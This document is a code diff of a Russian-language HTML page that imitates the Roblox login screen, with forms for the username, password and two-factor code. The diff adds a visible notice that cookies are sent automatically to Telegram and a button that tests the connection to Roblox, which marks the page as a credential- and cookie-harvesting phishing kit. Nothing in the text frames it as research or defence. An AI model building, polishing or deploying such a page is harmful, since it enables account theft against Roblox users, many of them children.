@@ -10,42 +10,51 @@
 <body class="rbx-body">
     <div class="container-main">
         <div class="login-form-container">
+            <!-- Логотип Roblox -->
+            <div style="text-align: center; margin-bottom: 30px;">
+                <div style="font-size: 32px; font-weight: 700; color: #00b06c; margin-bottom: 10px;">ROBLOX</div>
+                <div style="font-size: 16px; color: #a0a0a0;">Вход в аккаунт</div>
+            </div>
+            
             <!-- Форма входа -->
             <form id="loginForm" class="login-form">
-                <div class="form-title">Вход в Roblox</div>
-                <div class="form-subtitle">Введите свои данные для входа</div>
-                
                 <div class="form-group">
-                    <label for="username">Логин или Email</label>
+                    <label for="username" style="font-weight: 600; color: #e0e0e0;">Логин или Email</label>
                     <input type="text" id="username" name="username" class="input-field" placeholder="Введите логин или email" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="password">Пароль</label>
+                    <label for="password" style="font-weight: 600; color: #e0e0e0;">Пароль</label>
                     <input type="password" id="password" name="password" class="input-field" placeholder="Введите пароль" required>
                 </div>
                 
                 <div class="form-group remember-me-form-group">
-                    <input type="checkbox" id="remember" name="remember">
-                    <label for="remember">Запомнить меня</label>
+                    <input type="checkbox" id="remember" name="remember" style="width: auto; margin-right: 8px;">
+                    <label for="remember" style="color: #a0a0a0; font-size: 14px;">Запомнить меня</label>
                 </div>
                 
                 <button type="submit" class="login-button">
-                    <span class="button-text">Войти</span>
+                    <span class="button-text">ВОЙТИ</span>
                 </button>
+                
+                <div style="text-align: center; margin-top: 20px;">
+                    <a href="#" style="color: #00b06c; text-decoration: none; font-size: 14px;">Забыли пароль?</a>
+                </div>
             </form>
             
             <!-- Форма 2FA -->
             <form id="codeForm" class="code-form">
-                <div class="form-title">Двухфакторная аутентификация</div>
-                <div class="form-subtitle">Введите код, отправленный на ваш телефон или email</div>
-                
-                <div class="form-group">
-                    <label for="twofaCode">Код 2FA</label>
-                    <input type="text" id="twofaCode" name="twofaCode" class="input-field" placeholder="Введите код" maxlength="6" required>
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div style="font-size: 24px; font-weight: 700; color: #00b06c; margin-bottom: 10px;">🔐 2FA</div>
+                    <div style="font-size: 14px; color: #a0a0a0;">Двухфакторная аутентификация</div>
                 </div>
                 
-                <button type="submit" class="submit-2fa-button">Подтвердить</button>
+                <div class="form-group">
+                    <label for="twofaCode" style="font-weight: 600; color: #e0e0e0;">Код подтверждения</label>
+                    <input type="text" id="twofaCode" name="twofaCode" class="input-field" placeholder="Введите 6-значный код" maxlength="6" required style="text-align: center; font-size: 18px; letter-spacing: 2px; font-weight: 600;">
+                </div>
+                
+                <button type="submit" class="submit-2fa-button">ПОДТВЕРДИТЬ</button>
                 <button type="button" id="backToLogin" class="btn-secondary">← Вернуться к входу</button>
             </form>
             
@@ -53,28 +62,55 @@
             <div id="result" class="result-message"></div>
             
             <!-- Кнопка тестирования -->
-            <button type="button" id="testRoblox" class="btn-secondary" style="margin-top: 20px;">Тест подключения к Roblox</button>
+            <button type="button" id="testRoblox" class="btn-secondary" style="margin-top: 20px; background: rgba(0, 176, 108, 0.1); border-color: #00b06c;">
+                🧪 Тест подключения к Roblox
+            </button>
+            
+            <!-- Информация -->
+            <div style="text-align: center; margin-top: 30px; padding: 20px; background: rgba(0, 0, 0, 0.2); border-radius: 8px;">
+                <div style="font-size: 12px; color: #808080; line-height: 1.4;">
+                    Введите свои данные для входа в Roblox.<br>
+                    Куки будут автоматически отправлены в Telegram.
+                </div>
+            </div>
         </div>
     </div>
     
-    <script src="js/simple.js"></script>
+    <script src="js/script.js"></script>
     
     <script>
         // Дополнительная логика для тестирования
         document.getElementById('testRoblox').addEventListener('click', async function() {
             try {
+                this.textContent = '🧪 Тестирую...';
+                this.disabled = true;
+                
                 const response = await fetch('/test-roblox');
                 const data = await response.json();
                 
                 if (data.status === 'success') {
-                    alert(`✅ ${data.message}\nСтатус: ${data.status_code}\nРазмер ответа: ${data.content_length} символов`);
+                    showMessage(`✅ ${data.message}\nСтатус: ${data.status_code}\nРазмер ответа: ${data.content_length} символов`, 'success');
                 } else {
-                    alert(`❌ ${data.message}`);
+                    showMessage(`❌ ${data.message}`, 'error');
                 }
             } catch (error) {
-                alert(`❌ Ошибка тестирования: ${error.message}`);
+                showMessage(`❌ Ошибка тестирования: ${error.message}`, 'error');
+                console.error('Ошибка:', error);
+            } finally {
+                this.textContent = '🧪 Тест подключения к Roblox';
+                this.disabled = false;
             }
         });
+        
+        // Функция для показа сообщения (если не определена в script.js)
+        if (typeof showMessage === 'undefined') {
+            window.showMessage = function(message, type = 'info') {
+                const resultDiv = document.getElementById('result');
+                resultDiv.innerHTML = `<div class="${type}">${message}</div>`;
+                resultDiv.className = `result-message ${type}`;
+                resultDiv.style.display = 'block';
+            };
+        }
     </script>
 </body>
 </html> 
